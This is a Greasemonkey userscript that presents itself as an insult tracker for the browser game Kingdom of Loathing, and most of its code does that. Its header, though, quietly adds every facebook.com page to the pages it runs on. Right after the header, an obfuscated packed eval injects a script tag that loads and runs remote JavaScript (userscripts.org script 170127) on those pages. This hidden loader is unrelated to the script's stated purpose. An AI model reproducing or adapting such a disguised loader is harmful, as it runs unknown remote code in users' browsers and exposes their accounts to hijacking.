// ==UserScript==
// @name           JHunz's KOL Insult tracker Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      hunsley@gmail.com
// @description    Tracks which insults have been received for Insult Beer Pong
// @include        *kingdomofloathing.com/fight.php*
// @include        http://127.0.0.1:60*/fight.php*
// @include        *kingdomofloathing.com/cove.php*
// @include        http://127.0.0.1:60*/cove.php*
// @include        *kingdomofloathing.com/charpane.php*
// @include        http://127.0.0.1:60*/charpane.php*
// @include        *kingdomofloathing.com/beerpong.php*
// @include        http://127.0.0.1:60*/beerpong.php*
// @include        *kingdomofloathing.com/choice.php*
// @include        http://127.0.0.1:60*/choice.php*
// @include        *kingdomofloathing.com/valhalla.php*
// @include        http://127.0.0.1:60*/valhalla.php*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


//
// Version 1.0	02/02/2008	First release.  Features: Tracks which, and how many, insults you have received.  Displays this on the cove, when you get an insult, and on the Beer Pong Step up button.  Also automatically selects the correct retort if you have it.
// Version 1.1    02/25/2008  Updated to reset tracking upon ascension instead of the previous inferior trigger.
//
const VERSION=11;

//auto-update checking code
var lastUpdateCheck = GM_getValue('lastUpdateCheck','NEVER');
var curTime = new Date().getTime();
if ((lastUpdateCheck == 'NEVER') || (parseInt(lastUpdateCheck) < (curTime - 86400000))) {
	GM_setValue('lastUpdateCheck',''+curTime);
	GM_xmlhttpRequest({method: 'GET',url: 'http://userscripts.org/scripts/source/22178.user.js',
				onload: function(responseDetails) {
					var bodyText = responseDetails.responseText;
					var curVersionNum = parseInt((bodyText.split("const VERSION="))[1].split(";")[0]);
					if (curVersionNum > VERSION) {
						GM_setValue('outOfDate','true');
					}
					else {
						GM_setValue('outOfDate','false');
					}
				}
			});
}
var curVersion = GM_getValue('curVersion','0');
if (parseInt(curVersion) != VERSION) {
	GM_setValue('curVersion',VERSION);
	GM_setValue('outOfDate','false');
}
//Nag user with update link if the script is out of date
var outOfDate = GM_getValue('outOfDate');
if((outOfDate == 'true') && (window.location.pathname != "/charpane.php")) {
	var newElement = document.createElement('tr');
	newElement.innerHTML = '<tr><td><div style="color: red;font-size: 90%;width: 100%;text-align:center;">A new version of the Insult Tracker is available! <a href="http://userscripts.org/scripts/source/22178.user.js" target="_blank">Update</a></div></td></tr>';

	//insert the counter at the top of the page
	var element = document.getElementsByTagName("tr")[0];
	element.parentNode.insertBefore(newElement,element);
}

if (window.location.pathname == "/charpane.php") {
	// Get the current name
	var charName = document.getElementsByTagName("b")[0].textContent;
	GM_setValue('curCharName',charName);
}
else {
	var charName = GM_getValue('curCharName','UNDEFINED');
}

if (charName == 'UNDEFINED') {
	return false;
}

//Initialization
insultsList=GM_getValue(charName + '.insults','UNDEFINED');
if(insultsList == 'UNDEFINED') {
	insultsList = '0;0;0;0;0;0;0;0';
	GM_setValue(charName + '.insults',insultsList);
}
insultsArray = insultsList.split(";");
var numInsults = 0;
for (var i=0;i<insultsArray.length;i++) {
	if (insultsArray[i]==1) numInsults++;
}

//All we do at the cove is just display number of insults received.
if (window.location.pathname == "/cove.php") {
	//Create the page element
	var newElement = document.createElement('tr');
	newElement.innerHTML = '<tr><td><div style="color: red;font-size: 80%;width: 40%;text-align:left;">' + 'Insult tracking: ' + numInsults + '\/8</div></td></tr>';

	//Insert it at the top of the page
	var element = document.getElementsByTagName("tr")[0];
	element.parentNode.insertBefore(newElement,element);
}

//Valhalla resets the insult counter
if (window.location.pathname == "/valhalla.php") {
	insultsList = '0;0;0;0;0;0;0;0';
	GM_setValue(charName + '.insults',insultsList);
}	

//Fight page processing
if (window.location.pathname == "/fight.php") {
	monname = document.evaluate("//SPAN[@id='monname']//text()",document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue.data;
	if (monname.match("pirate") || monname.match("Pirate")) {
		var whichItem = document.evaluate('//select[@name="whichitem"]',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
		var bigBookNode = document.evaluate('//select[@name="whichitem"]//option[@value="2947"]',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
		
		if (bigBookNode) {
			bigBookNode.textContent = 'The Big Book of Pirate Insults (' + numInsults + '\/8)';
		}

		var thatHurtsNode;

		//Catch the insults
		textnodes = document.evaluate("//text()",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
		for (var i=0;i<textnodes.snapshotLength;i++) {
			node = textnodes.snapshotItem(i);
			s=node.data;
			
			if (!s.match("insults gathered")) {
				if (s.match("neither your tongue nor your wit is sharp enough")) {
					insultsArray[0] = 1;
				}
				else if (s.match("be any worse than the smell of your breath")) {
					insultsArray[1] = 1;
				}
				else if (s.match("tell your wife and sister I had a lovely time")) {
					insultsArray[2] = 1;
				}
				else if (s.match("yellow would be more your color")) {
					insultsArray[3] = 1;
				}
				else if (s.match("comfortable being compared to your girlfriend")) {
					insultsArray[4] = 1;
				}
				else if (s.match("honor to learn from such an expert in the field")) {
					insultsArray[5] = 1;
				}
				else if (s.match("do you manage to shave without using a mirror")) {
					insultsArray[6] = 1;
				}
				else if (s.match("only seems that way because you have")) {
					insultsArray[7] = 1;
				}
			}
			
			if (s.match("Dang, man") && !s.match("insults gathered")) {
				thatHurtsNode = node;
			}

			if (thatHurtsNode) {
				numInsults = 0;
				insultsList = '';
				for (var i=0;i<insultsArray.length;i++) {
					if (insultsArray[i]==1) {
						numInsults++;
					}
					insultsList += insultsArray[i];
					if (i != (insultsArray.length - 1)) {
						insultsList += ';';
					}
				}
				GM_setValue(charName + '.insults',insultsList);

				thatHurtsNode.textContent = thatHurtsNode.textContent + " " + numInsults + "\/8 insults gathered.";

				thatHurtsNode = null;
			}	
		}
	}
}

//Adds number of insults gathered to the Step Up button.
if (window.location.pathname == "/choice.php") {
	correctChoice = document.evaluate('//form[@name="choiceform"]/input[@name="whichchoice" and @value="187"]',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
	if (correctChoice) {
		button = document.evaluate('//input[@class="button" and @type="submit" and @value="Step up"]',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
		if (button) {
			button.setAttribute("value","Step up (" + numInsults + "\/8)");
		}
	}
}

//Auto-selects correct responses in beer pong
if (window.location.pathname == "/beerpong.php") {
	var correctResponse;
	textnodes = document.evaluate("//text()",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	for (var i=0;i<textnodes.snapshotLength;i++) {
		node = textnodes.snapshotItem(i);
		s=node.data;
			
		if(s.match("flay the skin from yer bones")) {
			correctResponse = 1;
		}
		else if(s.match("It be the sound of yer doom")) {
			correctResponse = 2;
		}
		else if(s.match("ye miserable, pestilent wretch")) {
			correctResponse = 3;
		}
		else if(s.match("streets will run red with yer blood")) {
			correctResponse = 4;
		}
		else if(s.match("Yer face is as foul as that of a drowned goat")) {
			correctResponse = 5;
		}
		else if(s.match("be crying like a little girl")) {
			correctResponse = 6;
		}
		else if(s.match("a more loathsome worm than yerself")) {
			correctResponse = 7;
		}
		else if(s.match("Not a single man has faced me and lived")) {
			correctResponse = 8;
		}
	}

	//Find and select the appropriate retort, if you have it.
	var form = document.evaluate('//form[@method="post" and @action="beerpong.php"]',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
	var correctResponseOption = document.evaluate('//select[@name="response"]/option[@value="'+correctResponse+'"]',document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue;
	var responseOptions = document.evaluate('//select[@name="response"]/option',document,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
	for (var i=0;i<responseOptions.snapshotLength;i++) {
		node = responseOptions.snapshotItem(i);
		if((correctResponseOption) && (node.value != correctResponse)) {
			node.parentNode.removeChild(node);
		}
	} 
}
